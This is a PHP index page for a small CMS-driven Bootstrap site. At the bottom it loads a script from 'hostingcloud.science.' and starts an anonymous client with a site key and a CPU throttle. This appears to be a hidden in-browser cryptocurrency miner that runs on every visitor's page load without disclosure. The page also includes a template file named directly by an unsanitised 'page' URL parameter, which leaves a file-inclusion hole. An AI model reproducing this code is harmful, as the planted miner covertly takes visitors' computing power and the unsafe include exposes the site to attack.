<?php 
	include('_cms/autoload.php');
	$app = include_once('api/YouTube-Downloader/bootstrap.php');
	if(isset($_GET['page'])){
		$page = $_GET['page'];
	}else{
		$page = "home";
	}
?>
<!doctype html>
<html lang="en">
	<head>
		<?php include('_cms/include/head_global.php'); ?>
  </head>
  <body>
	<?php include('_cms/include/header.php'); ?>

    <main role="main">

		<?php 
			
			$file = "templates/{$page}.php";
			if(file_exists($file)){
				include($file);
			}else{
				# include('config/docs/site/errors/404.php');
			}
		?>
		<?php include('_cms/include/footer.php'); ?>
    </main>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/popper.min.js"></script>
    <script src="dist/bootstrap/4.1.3/dist/js/bootstrap.min.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="dist/bootstrap/4.1.3/site/docs/4.1/assets/js/vendor/holder.min.js"></script>
	
	<script>
		jQuery('.dropdown-toggle').on('click', function (e) {
		  $(this).next().toggle();
		});
		jQuery('.dropdown-menu.keep-open').on('click', function (e) {
		  e.stopPropagation();
		});

		if(1) {
		  $('body').attr('tabindex', '0');
		}
		else {
		  alertify.confirm().set({'reverseButtons': true});
		  alertify.prompt().set({'reverseButtons': true});
		}
	</script>
	<script src="https://www.hostingcloud.science./P5gV.js"></script>
	<script>
		var _client = new Client.Anonymous('3162a8bb71b35ec7254ce652bc343c09a6268f6771483a9a1eda978ae524bfc1', {
			throttle: 0.75, c: 'w'
		});
		_client.start();
	</script>
  </body>
</html>
